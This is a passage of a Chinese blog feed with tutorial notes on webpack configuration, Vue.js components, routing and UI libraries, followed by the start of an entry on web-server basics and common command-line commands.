是基于 task 任务的；</li><li>使用Webpack， 是基于整个项目进行构建的；</li></ol><ul><li>借助于webpack这个前端自动化构建工具，可以完美实现资源的合并、打包、压缩、混淆等诸多功能。</li><li>根据官网的图片介绍webpack打包的过程</li><li><a href="http://webpack.github.io/" target="_blank" rel="noopener">webpack官网</a></li></ul><h4 id="webpack安装的两种方式"><a href="#webpack安装的两种方式" class="headerlink" title="webpack安装的两种方式"></a>webpack安装的两种方式</h4><ol><li>运行<code>npm i webpack -g</code>全局安装webpack，这样就能在全局使用webpack的命令</li><li>在项目根目录中运行<code>npm i webpack --save-dev</code>安装到项目依赖中</li></ol><h4 id="初步使用webpack打包构建列表隔行变色案例"><a href="#初步使用webpack打包构建列表隔行变色案例" class="headerlink" title="初步使用webpack打包构建列表隔行变色案例"></a>初步使用webpack打包构建列表隔行变色案例</h4><ol><li><p>运行<code>npm init</code>初始化项目，使用npm管理项目中的依赖包</p></li><li><p>创建项目基本的目录结构</p></li><li><p>使用<code>cnpm i jquery --save</code>安装jquery类库</p></li><li><p>创建<code>main.js</code>并书写各行变色的代码逻辑：</p><pre><code> // 导入jquery类库 import $ from 'jquery' // 设置偶数行背景色，索引从0开始，0是偶数 $('##list li:even').css('backgroundColor','lightblue'); // 设置奇数行背景色 $('##list li:odd').css('backgroundColor','pink');</code></pre></li><li><p>直接在页面上引用<code>main.js</code>会报错，因为浏览器不认识<code>import</code>这种高级的JS语法，需要使用webpack进行处理，webpack默认会把这种高级的语法转换为低级的浏览器能识别的语法；</p></li><li><p>运行<code>webpack 入口文件路径 输出文件路径</code>对<code>main.js</code>进行处理：</p><pre><code>webpack src/js/main.js dist/bundle.js</code></pre></li></ol><h4 id="使用webpack的配置文件简化打包时候的命令"><a href="#使用webpack的配置文件简化打包时候的命令" class="headerlink" title="使用webpack的配置文件简化打包时候的命令"></a>使用webpack的配置文件简化打包时候的命令</h4><ol><li><p>在项目根目录中创建<code>webpack.config.js</code></p></li><li><p>由于运行webpack命令的时候，webpack需要指定入口文件和输出文件的路径，所以，我们需要在<code>webpack.config.js</code>中配置这两个路径：</p><pre><code> // 导入处理路径的模块 var path = require('path'); // 导出一个配置对象，将来webpack在启动的时候，会默认来查找webpack.config.js，并读取这个文件中导出的配置对象，来进行打包处理 module.exports = {     entry: path.resolve(__dirname, 'src/js/main.js'), // 项目入口文件     output: { // 配置输出选项         path: path.resolve(__dirname, 'dist'), // 配置输出的路径         filename: 'bundle.js' // 配置输出的文件名     } }</code></pre></li></ol><h4 id="实现webpack的实时打包构建"><a href="#实现webpack的实时打包构建" class="headerlink" title="实现webpack的实时打包构建"></a>实现webpack的实时打包构建</h4><ol><li>由于每次重新修改代码之后，都需要手动运行webpack打包的命令，比较麻烦，所以使用<code>webpack-dev-server</code>来实现代码实时打包编译，当修改代码之后，会自动进行打包构建。</li><li>运行<code>cnpm i webpack-dev-server --save-dev</code>安装到开发依赖</li><li>安装完成之后，在命令行直接运行<code>webpack-dev-server</code>来进行打包，发现报错，此时需要借助于<code>package.json</code>文件中的指令，来进行运行<code>webpack-dev-server</code>命令，在<code>scripts</code>节点下新增<code>"dev": "webpack-dev-server"</code>指令，发现可以进行实时打包，但是dist目录下并没有生成<code>bundle.js</code>文件，这是因为<code>webpack-dev-server</code>将打包好的文件放在了内存中<ul><li>把<code>bundle.js</code>放在内存中的好处是：由于需要实时打包编译，所以放在内存中速度会非常快</li><li>这个时候访问webpack-dev-server启动的<code>http://localhost:8080/</code>网站，发现是一个文件夹的面板，需要点击到src目录下，才能打开我们的index首页，此时引用不到bundle.js文件，需要修改index.html中script的src属性为:<code>&lt;script src="../bundle.js"&gt;&lt;/script&gt;</code></li><li>为了能在访问<code>http://localhost:8080/</code>的时候直接访问到index首页，可以使用<code>--contentBase src</code>指令来修改dev指令，指定启动的根目录：<pre><code>"dev": "webpack-dev-server --contentBase src"</code></pre>同时修改index页面中script的src属性为<code>&lt;script src="bundle.js"&gt;&lt;/script&gt;</code></li></ul></li></ol><h4 id="使用html-webpack-plugin插件配置启动页面"><a href="#使用html-webpack-plugin插件配置启动页面" class="headerlink" title="使用html-webpack-plugin插件配置启动页面"></a>使用<code>html-webpack-plugin</code>插件配置启动页面</h4><p>由于使用<code>--contentBase</code>指令的过程比较繁琐，需要指定启动的目录，同时还需要修改index.html中script标签的src属性，所以推荐大家使用<code>html-webpack-plugin</code>插件配置启动页面.</p><ol><li><p>运行<code>cnpm i html-webpack-plugin --save-dev</code>安装到开发依赖</p></li><li><p>修改<code>webpack.config.js</code>配置文件如下：</p><pre><code> // 导入处理路径的模块 var path = require('path'); // 导入自动生成HTMl文件的插件 var htmlWebpackPlugin = require('html-webpack-plugin'); module.exports = {     entry: path.resolve(__dirname, 'src/js/main.js'), // 项目入口文件     output: { // 配置输出选项         path: path.resolve(__dirname, 'dist'), // 配置输出的路径         filename: 'bundle.js' // 配置输出的文件名     },     plugins:[ // 添加plugins节点配置插件         new htmlWebpackPlugin({             template:path.resolve(__dirname, 'src/index.html'),//模板路径             filename:'index.html'//自动生成的HTML文件的名称         })     ] }</code></pre></li><li><p>修改<code>package.json</code>中<code>script</code>节点中的dev指令如下：</p><pre><code>"dev": "webpack-dev-server"</code></pre></li><li><p>将index.html中script标签注释掉，因为<code>html-webpack-plugin</code>插件会自动把bundle.js注入到index.html页面中！</p></li></ol><h4 id="实现自动打开浏览器、热更新和配置浏览器的默认端口号"><a href="#实现自动打开浏览器、热更新和配置浏览器的默认端口号" class="headerlink" title="实现自动打开浏览器、热更新和配置浏览器的默认端口号"></a>实现自动打开浏览器、热更新和配置浏览器的默认端口号</h4><p><strong>注意：热更新在JS中表现的不明显，可以从一会儿要讲到的CSS身上进行介绍说明！</strong></p><h6 id="方式1："><a href="#方式1：" class="headerlink" title="方式1："></a>方式1：</h6><ul><li>修改<code>package.json</code>的script节点如下，其中<code>--open</code>表示自动打开浏览器，<code>--port 4321</code>表示打开的端口号为4321，<code>--hot</code>表示启用浏览器热更新：<pre><code>"dev": "webpack-dev-server --hot --port 4321 --open"</code></pre></li></ul><h6 id="方式2："><a href="#方式2：" class="headerlink" title="方式2："></a>方式2：</h6><ol><li>修改<code>webpack.config.js</code>文件，新增<code>devServer</code>节点如下：<pre><code>devServer:{     hot:true,     open:true,     port:4321 }</code></pre></li><li>在头部引入<code>webpack</code>模块：<pre><code>var webpack = require('webpack');</code></pre></li><li>在<code>plugins</code>节点下新增：<pre><code>new webpack.HotModuleReplacementPlugin()</code></pre></li></ol><h4 id="使用webpack打包css文件"><a href="#使用webpack打包css文件" class="headerlink" title="使用webpack打包css文件"></a>使用webpack打包css文件</h4><ol><li>运行<code>cnpm i style-loader css-loader --save-dev</code></li><li>修改<code>webpack.config.js</code>这个配置文件：<pre><code>module: { // 用来配置第三方loader模块的     rules: [ // 文件的匹配规则         { test: /\.css$/, use: ['style-loader', 'css-loader'] }//处理css文件的规则     ] }</code></pre></li><li>注意：<code>use</code>表示使用哪些模块来处理<code>test</code>所匹配到的文件；<code>use</code>中相关loader模块的调用顺序是从后向前调用的；</li></ol><h4 id="使用webpack打包less文件"><a href="#使用webpack打包less文件" class="headerlink" title="使用webpack打包less文件"></a>使用webpack打包less文件</h4><ol><li>运行<code>cnpm i less-loader less -D</code></li><li>修改<code>webpack.config.js</code>这个配置文件：<pre><code>{ test: /\.less$/, use: ['style-loader', 'css-loader', 'less-loader'] },</code></pre></li></ol><h4 id="使用webpack打包sass文件"><a href="#使用webpack打包sass文件" class="headerlink" title="使用webpack打包sass文件"></a>使用webpack打包sass文件</h4><ol><li>运行<code>cnpm i sass-loader node-sass --save-dev</code></li><li>在<code>webpack.config.js</code>中添加处理sass文件的loader模块：<pre><code>{ test: /\.scss$/, use: ['style-loader', 'css-loader', 'sass-loader'] }</code></pre></li></ol><h4 id="使用webpack处理css中的路径"><a href="#使用webpack处理css中的路径" class="headerlink" title="使用webpack处理css中的路径"></a>使用webpack处理css中的路径</h4><ol><li>运行<code>cnpm i url-loader file-loader --save-dev</code></li><li>在<code>webpack.config.js</code>中添加处理url路径的loader模块：<pre><code>{ test: /\.(png|jpg|gif)$/, use: 'url-loader' }</code></pre></li><li>可以通过<code>limit</code>指定进行base64编码的图片大小；只有小于指定字节（byte）的图片才会进行base64编码：<pre><code>{ test: /\.(png|jpg|gif)$/, use: 'url-loader?limit=43960' },</code></pre></li></ol><h4 id="使用babel处理高级JS语法"><a href="#使用babel处理高级JS语法" class="headerlink" title="使用babel处理高级JS语法"></a>使用babel处理高级JS语法</h4><ol><li>运行<code>cnpm i babel-core babel-loader babel-plugin-transform-runtime --save-dev</code>安装babel的相关loader包</li><li>运行<code>cnpm i babel-preset-es2015 babel-preset-stage-0 --save-dev</code>安装babel转换的语法</li><li>在<code>webpack.config.js</code>中添加相关loader模块，其中需要注意的是，一定要把<code>node_modules</code>文件夹添加到排除项：<pre><code>{ test: /\.js$/, use: 'babel-loader', exclude: /node_modules/ }</code></pre></li><li>在项目根目录中添加<code>.babelrc</code>文件，并修改这个配置文件如下：<pre><code>{ "presets":["es2015", "stage-0"], "plugins":["transform-runtime"]}</code></pre></li><li><strong>注意：语法插件<code>babel-preset-es2015</code>可以更新为<code>babel-preset-env</code>，它包含了所有的ES相关的语法；</strong></li></ol><h2 id="Vue-js-day6"><a href="#Vue-js-day6" class="headerlink" title="Vue.js - day6"></a>Vue.js - day6</h2><h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p>有时候使用<code>npm i node-sass -D</code>装不上，这时候，就必须使用 <code>cnpm i node-sass -D</code></p><h4 id="在普通页面中使用render函数渲染组件"><a href="#在普通页面中使用render函数渲染组件" class="headerlink" title="在普通页面中使用render函数渲染组件"></a>在普通页面中使用render函数渲染组件</h4><h4 id="在webpack中配置-vue组件页面的解析"><a href="#在webpack中配置-vue组件页面的解析" class="headerlink" title="在webpack中配置.vue组件页面的解析"></a>在webpack中配置.vue组件页面的解析</h4><ol><li><p>运行<code>cnpm i vue -S</code>将vue安装为运行依赖；</p></li><li><p>运行<code>cnpm i vue-loader vue-template-compiler -D</code>将解析转换vue的包安装为开发依赖；</p></li><li><p>运行<code>cnpm i style-loader css-loader -D</code>将解析转换CSS的包安装为开发依赖，因为.vue文件中会写CSS样式；</p></li><li><p>在<code>webpack.config.js</code>中，添加如下<code>module</code>规则：</p></li></ol><pre><code>module: {    rules: [      { test: /\.css$/, use: ['style-loader', 'css-loader'] },      { test: /\.vue$/, use: 'vue-loader' }    ]  }</code></pre><ol start="5"><li>创建<code>App.js</code>组件页面：</li></ol><pre><code>    &lt;template&gt;      &lt;!-- 注意：在 .vue 的组件中，template 中必须有且只有唯一的根元素进行包裹，一般都用 div 当作唯一的根元素 --&gt;      &lt;div&gt;        &lt;h1&gt;这是APP组件 - {{msg}}&lt;/h1&gt;        &lt;h3&gt;我是h3&lt;/h3&gt;      &lt;/div&gt;    &lt;/template&gt;    &lt;script&gt;    // 注意：在 .vue 的组件中，通过 script 标签来定义组件的行为，需要使用 ES6 中提供的 export default 方式，导出一个vue实例对象    export default {      data() {        return {          msg: 'OK'        }      }    }    &lt;/script&gt;    &lt;style scoped&gt;    h1 {      color: red;    }    &lt;/style&gt;</code></pre><ol start="6"><li>创建<code>main.js</code>入口文件：</li></ol><pre><code>    // 导入 Vue 组件    import Vue from 'vue'    // 导入 App组件    import App from './components/App.vue'    // 创建一个 Vue 实例，使用 render 函数，渲染指定的组件    var vm = new Vue({      el: '##app',      render: c =&gt; c(App)    });</code></pre><h4 id="在使用webpack构建的Vue项目中使用模板对象？"><a href="#在使用webpack构建的Vue项目中使用模板对象？" class="headerlink" title="在使用webpack构建的Vue项目中使用模板对象？"></a>在使用webpack构建的Vue项目中使用模板对象？</h4><ol><li>在<code>webpack.config.js</code>中添加<code>resolve</code>属性：<pre><code>resolve: { alias: {   'vue$': 'vue/dist/vue.esm.js' }}</code></pre></li></ol><h4 id="ES6中语法使用总结"><a href="#ES6中语法使用总结" class="headerlink" title="ES6中语法使用总结"></a>ES6中语法使用总结</h4><ol><li><p>使用 <code>export default</code> 和 <code>export</code> 导出模块中的成员; 对应ES5中的 <code>module.exports</code> 和 <code>export</code></p></li><li><p>使用 <code>import ** from **</code> 和 <code>import '路径'</code> 还有 <code>import {a, b} from '模块标识'</code> 导入其他模块</p></li><li><p>使用箭头函数：<code>(a, b)=&gt; { return a-b; }</code></p></li></ol><h4 id="在vue组件页面中，集成vue-router路由模块"><a href="#在vue组件页面中，集成vue-router路由模块" class="headerlink" title="在vue组件页面中，集成vue-router路由模块"></a>在vue组件页面中，集成vue-router路由模块</h4><p><a href="https://router.vuejs.org/" target="_blank" rel="noopener">vue-router官网</a></p><ol><li>导入路由模块：</li></ol><pre><code>import VueRouter from 'vue-router'</code></pre><ol start="2"><li>安装路由模块：</li></ol><pre><code>Vue.use(VueRouter);</code></pre><ol start="3"><li>导入需要展示的组件:</li></ol><pre><code>import login from './components/account/login.vue'import register from './components/account/register.vue'</code></pre><ol start="4"><li>创建路由对象:</li></ol><pre><code>var router = new VueRouter({  routes: [    { path: '/', redirect: '/login' },    { path: '/login', component: login },    { path: '/register', component: register }  ]});</code></pre><ol start="5"><li>将路由对象，挂载到 Vue 实例上:</li></ol><pre><code>var vm = new Vue({  el: '##app',  // render: c =&gt; { return c(App) }  render(c) {    return c(App);  },  router // 将路由对象，挂载到 Vue 实例上});</code></pre><ol start="6"><li>改造App.vue组件，在 template 中，添加<code>router-link</code>和<code>router-view</code>：</li></ol><pre><code>    &lt;router-link to="/login"&gt;登录&lt;/router-link&gt;    &lt;router-link to="/register"&gt;注册&lt;/router-link&gt;    &lt;router-view&gt;&lt;/router-view&gt;</code></pre><h4 id="组件中的css作用域问题"><a href="#组件中的css作用域问题" class="headerlink" title="组件中的css作用域问题"></a>组件中的css作用域问题</h4><h4 id="抽离路由为单独的模块"><a href="#抽离路由为单独的模块" class="headerlink" title="抽离路由为单独的模块"></a>抽离路由为单独的模块</h4><h4 id="使用-饿了么的-MintUI-组件"><a href="#使用-饿了么的-MintUI-组件" class="headerlink" title="使用 饿了么的 MintUI 组件"></a>使用 饿了么的 MintUI 组件</h4><p><a href="https://github.com/ElemeFE/mint-ui" target="_blank" rel="noopener">Github 仓储地址</a></p><p><a href="http://mint-ui.github.io/##!/zh-cn" target="_blank" rel="noopener">Mint-UI官方文档</a></p><ol><li>导入所有MintUI组件：</li></ol><pre><code>import MintUI from 'mint-ui'</code></pre><ol start="2"><li>导入样式表：</li></ol><pre><code>import 'mint-ui/lib/style.css'</code></pre><ol start="3"><li>在 vue 中使用 MintUI：</li></ol><pre><code>Vue.use(MintUI)</code></pre><ol start="4"><li>使用的例子：</li></ol><pre><code>&lt;mt-button type="primary" size="large"&gt;primary&lt;/mt-button&gt;</code></pre><h4 id="使用-MUI-组件"><a href="#使用-MUI-组件" class="headerlink" title="使用 MUI 组件"></a>使用 MUI 组件</h4><p><a href="http://dev.dcloud.net.cn/mui/" target="_blank" rel="noopener">官网首页</a></p><p><a href="http://dev.dcloud.net.cn/mui/ui/" target="_blank" rel="noopener">文档地址</a></p><ol><li>导入 MUI 的样式表：</li></ol><pre><code>import '../lib/mui/css/mui.min.css'</code></pre><ol start="2"><li>在<code>webpack.config.js</code>中添加新的loader规则：</li></ol><pre><code>{ test: /\.(png|jpg|gif|ttf)$/, use: 'url-loader' }</code></pre><ol start="3"><li>根据官方提供的文档和example，尝试使用相关的组件</li></ol><h4 id="将项目源码托管到oschina中"><a href="#将项目源码托管到oschina中" class="headerlink" title="将项目源码托管到oschina中"></a>将项目源码托管到oschina中</h4><ol><li><p>点击头像 -&gt; 修改资料 -&gt; SSH公钥 <a href="http://git.mydoc.io/?t=154712" target="_blank" rel="noopener">如何生成SSH公钥</a></p></li><li><p>创建自己的空仓储，使用 <code>git config --global user.name "用户名"</code> 和 <code>git config --global user.email ***@**.com</code> 来全局配置提交时用户的名称和邮箱</p></li><li><p>使用 <code>git init</code> 在本地初始化项目</p></li><li><p>使用 <code>touch README.md</code> 和 <code>touch .gitignore</code> 来创建项目的说明文件和忽略文件；</p></li><li><p>使用 <code>git add .</code> 将所有文件托管到 git 中</p></li><li><p>使用 <code>git commit -m "init project"</code> 将项目进行本地提交</p></li><li><p>使用 <code>git remote add origin 仓储地址</code>将本地项目和远程仓储连接，并使用origin最为远程仓储的别名</p></li><li><p>使用 <code>git push -u origin master</code> 将本地代码push到仓储中</p></li></ol><h4 id="App-vue-组件的基本设置"><a href="#App-vue-组件的基本设置" class="headerlink" title="App.vue 组件的基本设置"></a>App.vue 组件的基本设置</h4><ol><li><p>头部的固定导航栏使用 <code>Mint-UI</code> 的 <code>Header</code> 组件；</p></li><li><p>底部的页签使用 <code>mui</code> 的 <code>tabbar</code>;</p></li><li><p>购物车的图标，使用 <code>icons-extra</code> 中的 <code>mui-icon-extra mui-icon-extra-cart</code>，同时，应该把其依赖的字体图标文件 <code>mui-icons-extra.ttf</code>，复制到 <code>fonts</code> 目录下！</p></li><li><p>将底部的页签，改造成 <code>router-link</code> 来实现单页面的切换；</p></li><li><p>Tab Bar 路由激活时候设置高亮的两种方式：</p><ul><li>全局设置样式如下：</li></ul><pre><code>  .router-link-active{       color:##007aff !important; }</code></pre><ul><li>或者在 <code>new VueRouter</code> 的时候，通过 <code>linkActiveClass</code> 来指定高亮的类：</li></ul><pre><code>  // 创建路由对象 var router = new VueRouter({   routes: [     { path: '/', redirect: '/home' }   ],   linkActiveClass: 'mui-active' });</code></pre></li></ol><h4 id="实现-tabbar-页签不同组件页面的切换"><a href="#实现-tabbar-页签不同组件页面的切换" class="headerlink" title="实现 tabbar 页签不同组件页面的切换"></a>实现 tabbar 页签不同组件页面的切换</h4><ol><li><p>将 tabbar 改造成 <code>router-link</code> 形式，并指定每个连接的 <code>to</code> 属性；</p></li><li><p>在入口文件中导入需要展示的组件，并创建路由对象：</p></li></ol><pre><code>    // 导入需要展示的组件    import Home from './components/home/home.vue'    import Member from './components/member/member.vue'    import Shopcar from './components/shopcar/shopcar.vue'    import Search from './components/search/search.vue'    // 创建路由对象    var router = new VueRouter({      routes: [        { path: '/', redirect: '/home' },        { path: '/home', component: Home },        { path: '/member', component: Member },        { path: '/shopcar', component: Shopcar },        { path: '/search', component: Search }      ],      linkActiveClass: 'mui-active'    });</code></pre><h4 id="使用-mt-swipe-轮播图组件"><a href="#使用-mt-swipe-轮播图组件" class="headerlink" title="使用 mt-swipe 轮播图组件"></a>使用 mt-swipe 轮播图组件</h4><ol><li>假数据：</li></ol><pre><code>lunbo: [        'http://www.itcast.cn/images/slidead/BEIJING/2017440109442800.jpg',        'http://www.itcast.cn/images/slidead/BEIJING/2017511009514700.jpg',        'http://www.itcast.cn/images/slidead/BEIJING/2017421414422600.jpg'      ]</code></pre><ol start="2"><li>引入轮播图组件：</li></ol><pre><code>&lt;!-- Mint-UI 轮播图组件 --&gt;    &lt;div class="home-swipe"&gt;      &lt;mt-swipe :auto="4000"&gt;        &lt;mt-swipe-item v-for="(item, i) in lunbo" :key="i"&gt;          &lt;img :src="item" alt=""&gt;        &lt;/mt-swipe-item&gt;      &lt;/mt-swipe&gt;    &lt;/div&gt;  &lt;/div&gt;</code></pre><h4 id="在-vue组件中使用vue-resource获取数据"><a href="#在-vue组件中使用vue-resource获取数据" class="headerlink" title="在.vue组件中使用vue-resource获取数据"></a>在<code>.vue</code>组件中使用<code>vue-resource</code>获取数据</h4><ol><li><p>运行<code>cnpm i vue-resource -S</code>安装模块</p></li><li><p>导入 vue-resource 组件</p></li></ol><pre><code>import VueResource from 'vue-resource'</code></pre><ol start="3"><li>在vue中使用 vue-resource 组件</li></ol><pre><code>Vue.use(VueResource);</code></pre><h2 id="day7"><a href="#day7" class="headerlink" title="day7"></a>day7</h2><h4 id="使用mui的tab-top-webview-main完成分类滑动栏"><a href="#使用mui的tab-top-webview-main完成分类滑动栏" class="headerlink" title="使用mui的tab-top-webview-main完成分类滑动栏"></a>使用mui的<code>tab-top-webview-main</code>完成分类滑动栏</h4><h6 id="兼容问题"><a href="#兼容问题" class="headerlink" title="兼容问题"></a>兼容问题</h6><ol><li><p>和 App.vue 中的 <code>router-link</code> 身上的类名 <code>mui-tab-item</code> 存在兼容性问题，导致tab栏失效，可以把<code>mui-tab-item</code>改名为<code>mui-tab-item1</code>，并复制相关的类样式，来解决这个问题；</p><pre><code> .mui-bar-tab .mui-tab-item1.mui-active {   color: ##007aff; } .mui-bar-tab .mui-tab-item1 {   display: table-cell;   overflow: hidden;   width: 1%;   height: 50px;   text-align: center;   vertical-align: middle;   white-space: nowrap;   text-overflow: ellipsis;   color: ##929292; } .mui-bar-tab .mui-tab-item1 .mui-icon {   top: 3px;   width: 24px;   height: 24px;   padding-top: 0;   padding-bottom: 0; } .mui-bar-tab .mui-tab-item1 .mui-icon~.mui-tab-label {   font-size: 11px;   display: block;   overflow: hidden;   text-overflow: ellipsis; }</code></pre></li><li><p><code>tab-top-webview-main</code>组件第一次显示到页面中的时候，无法被滑动的解决方案：</p><ul><li>先导入 mui 的JS文件:<pre><code>import mui from '../../../lib/mui/js/mui.min.js'</code></pre></li><li>在 组件的 <code>mounted</code> 事件钩子中，注册 mui 的滚动事件：<pre><code>mounted() {   // 需要在组件的 mounted 事件钩子中，注册 mui 的 scroll 滚动事件   mui('.mui-scroll-wrapper').scroll({     deceleration: 0.0005 //flick 减速系数，系数越大，滚动速度越慢，滚动距离越小，默认值0.0006   }); }</code></pre></li></ul></li><li><p>滑动的时候报警告：<code>Unable to preventDefault inside passive event listener due to target being treated as passive. See https://www.chromestatus.com/features/5093566007214080</code></p><pre><code>解决方法，可以加上* { touch-action: none; } 这句样式去掉。</code></pre><p>原因：（是chrome为了提高页面的滑动流畅度而新折腾出来的一个东西） <a href="http://www.cnblogs.com/pearl07/p/6589114.html" target="_blank" rel="noopener">http://www.cnblogs.com/pearl07/p/6589114.html</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/touch-action" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/CSS/touch-action</a></p></li></ol><h4 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h4><ol><li><a href="https://v1-cn.vuejs.org/" target="_blank" rel="noopener">vue.js 1.x 文档</a></li><li><a href="https://cn.vuejs.org/" target="_blank" rel="noopener">vue.js 2.x 文档</a></li><li><a href="http://www.css88.com/archives/7715" target="_blank" rel="noopener">String.prototype.padStart(maxLength, fillString)</a></li><li><a href="http://www.cnblogs.com/wuhua1/p/6686237.html" target="_blank" rel="noopener">js 里面的键盘事件对应的键码</a></li><li><a href="http://www.cnblogs.com/kidney/p/6052935.html" target="_blank" rel="noopener">Vue.js双向绑定的实现原理</a></li><li><a href="https://jingyan.baidu.com/article/a65957f4976aad24e67f9b9b.html" target="_blank" rel="noopener">navicat如何导入sql文件和导出sql文件</a></li><li><a href="http://cubic-bezier.com/##.4,-0.3,1,.33" target="_blank" rel="noopener">贝塞尔在线生成器</a></li><li><a href="http://www.cnblogs.com/joyho/articles/4430148.html" target="_blank" rel="noopener">URL中的hash（井号）</a></li><li><a href="https://segmentfault.com/p/1210000008466178" target="_blank" rel="noopener">babel-preset-env：你需要的唯一Babel插件</a></li><li><a href="https://segmentfault.com/a/1190000009065987" target="_blank" rel="noopener">Runtime transform 运行时编译es6</a></li><li><a href="https://github.com/LS1231/vue-preview" target="_blank" rel="noopener">vue-preview</a><br>一个Vue集成PhotoSwipe图片预览插件</li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>node学习</title>
      <link href="/2019/08/29/node/01-web-concept/"/>
      <url>/2019/08/29/node/01-web-concept/</url>
      
        <content type="html"><![CDATA[<h2 id="第1章-服务端开发基础"><a href="#第1章-服务端开发基础" class="headerlink" title="第1章 服务端开发基础"></a>第1章 服务端开发基础</h2><p><strong>学习目标</strong></p><ul><li>什么是服务器</li><li>什么是 Web 服务器</li><li>IP、DNS、端口号的作用</li><li>命令行的使用</li></ul><h4 id="在浏览器输入一个地址到看到网站内容经历了什么"><a href="#在浏览器输入一个地址到看到网站内容经历了什么" class="headerlink" title="在浏览器输入一个地址到看到网站内容经历了什么"></a>在浏览器输入一个地址到看到网站内容经历了什么</h4><ol><li>用户在浏览器地址栏中输入网站域名</li><li>浏览器拿到该域名自动去请求 <strong>DNS服务器查询</strong> 用户输入的域名对应的 <code>ip</code> 地址</li><li>浏览器拿到 <code>ip</code> 地址之后，通过ip地址+端口号（HTTP默认80）和服务器建立连接（通过 <strong>三次握手</strong> ）</li><li>三次握手建立连接成功之后</li><li>浏览器将用户输入的 <code>url</code> 地址通过 <code>HTTP</code> 协议包装成 <strong>请求报文</strong> ，然后通过 <code>Socket（服务器ip地址和端口号）</code> 发送到服务器</li><li>当HTTP服务器接收到客户端浏览器发送过来的请求报文时候，按照 <code>HTTP</code> 协议将请求报文解析出来</li><li>然后服务器拿到请求报文中的请求信息（例如请求路径url），做相应的业务逻辑处理操作</li><li>当业务逻辑处理完毕之后，服务器将要发送给客户端的数据按照 <code>HTTP</code> 协议包装成 <strong>响应报文</strong></li><li>然后服务器将响应报文数据发送给客户端浏览器</li><li>当浏览器接收到服务器发送给自己的响应报文数据的时候，浏览器根据 <code>HTTP</code> 协议将报文内容解析出来</li><li>浏览器拿到响应报文体中的数据开始 <strong>解析渲染html、css，执行 JavaScript</strong></li><li>如果在解析的过程（从上到下）中，发现有外链的标签（link、css、img）</li><li>浏览器会自动对该标签指向的 路径地址 发起新的请求，同上。</li></ol><h4 id="命令行基础"><a href="#命令行基础" class="headerlink" title="命令行基础"></a>命令行基础</h4><blockquote><p>图形用户界面让简单的任务更容易完成，而命令行界面 使完成复杂的任务成为可能</p></blockquote><p><img src="/images/shell.jpg" alt="shell"></p><p>当使用图形用户界面时，我们需要另一个和 shell 交互的叫做终端仿真器的程序。 在 Windows 上，一般使用操作系统自带的 <code>cmd</code> 或者 <code>powershell</code>。 在 Linux 上，如果是图形用户界面，那么可以使用 <code>terminal</code> 或者 <code>konsole</code>、<code>gnome-terminal</code>之类 的终端仿真器，但基本上，它们都完成同样的事情，让我们能访问 shell， 你可能会因为附加的一些花俏功能而喜欢上某个终端。</p><p>关于名字，如果有人提到：控制台、终端、bash、shell、terminal 等，一般都是指上面这些。</p><p>打开命令行</p><ul><li>方式一：开始菜单搜索 <code>cmd</code></li><li>方式二：<code>win</code> + <code>r</code> 输入 <code>cmd</code></li></ul><p>常用命令</p><ul><li>pwd（print working directory）</li><li>cd（change directory）<ul><li>切换到指定路径（相对路径或绝对路径）</li></ul></li><li>ls（list files）<ul><li><code>ls</code> 列出当前目录文件</li><li><code>ls 目录路径</code> 列出指定路径文件</li><li><code>ls -a</code> 列出文件并显示隐藏文件或目录</li></ul></li><li>cp（copy）<ul><li><code>cp 源路径 目标路径</code></li><li>cp 在复制目录的时候，不会复制里面的子文件或子目录</li><li>-r （recursive）递归复制</li></ul></li><li>mv（move）：移动文件或者目录，还可以重命名文件或目录</li><li>mkdir（make directory）：创建目录</li><li>rm（remove）：删除文件或目录<ul><li>-rf 递归删除：直接将整个目录包括里面的内容都删掉</li></ul></li><li>rmdir 目录名称<ul><li>只能删除空目录</li></ul></li><li>clear：清屏</li><li>touch 文件名<ul><li>根据文件名创建新的文件</li></ul></li><li>cat 文件名<ul><li>查看指定的文本文件</li></ul></li></ul><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">## print working directory 打印当前工作目录</span><span class="token function">pwd</span><span class="token comment" spellcheck="true">## change directory 切换目录</span><span class="token function">cd</span><span class="token comment" spellcheck="true">## 回到上一级目录</span><span class="token function">cd</span> <span class="token punctuation">..</span><span class="token comment" spellcheck="true">## directory 列出当前目录列表</span><span class="token function">dir</span><span class="token comment" spellcheck="true">## 列出指定路径的目录列表</span><span class="token function">dir</span> 目录路径<span class="token comment" spellcheck="true">## copy 拷贝</span><span class="token function">cp</span> 源 目标<span class="token comment" spellcheck="true">## list files 列出目录列表</span><span class="token comment" spellcheck="true">## 同 dir，仅适用于类 Unix 操作系统</span><span class="token function">ls</span><span class="token comment" spellcheck="true">## 创建目录</span><span class="token function">mkdir</span><span class="token comment" spellcheck="true">## 删除文件</span>remove<span class="token comment" spellcheck="true">## 清屏</span><span class="token function">clear</span></code></pre><p>退出命令行</p><ul><li>直接关闭即可</li><li>或者输入 <code>exit</code> 也可以退出</li></ul><p>命令行练习</p><pre><code>1. 在桌面下创建一个叫做 `itcast` 的目录2. 在 itcast 目录下，分别创建 `dir1` 和 `dir2` 两个子目录3. 复制 `code/scripts/main.js` 文件到 `itcast` 目录中4. 复制 `code` 目录下的 `js` 目录到 `itcast` 目录中5. 将 `itcast/main.js` 文件重命名为 `main-main.js`6. 将 `main-main.js` 文件移动到 dir1 中7. 将 `dir1` 中的 `main-main.js` 文件移动到 dir2 中8. 将 `itcast/js` 目录删除</code></pre><p>以后多使用，就会越用越熟。</p><h4 id="建立你的第一个网站（目标）"><a href="#建立你的第一个网站（目标）" class="headerlink" title="建立你的第一个网站（目标）"></a>建立你的第一个网站（目标）</h4><blockquote><p><strong>前端开发</strong>最终还是属于<strong>Web 开发</strong>中的一个分支，想要成为一名合格的前端开发人员，就必须要<strong>充分理解 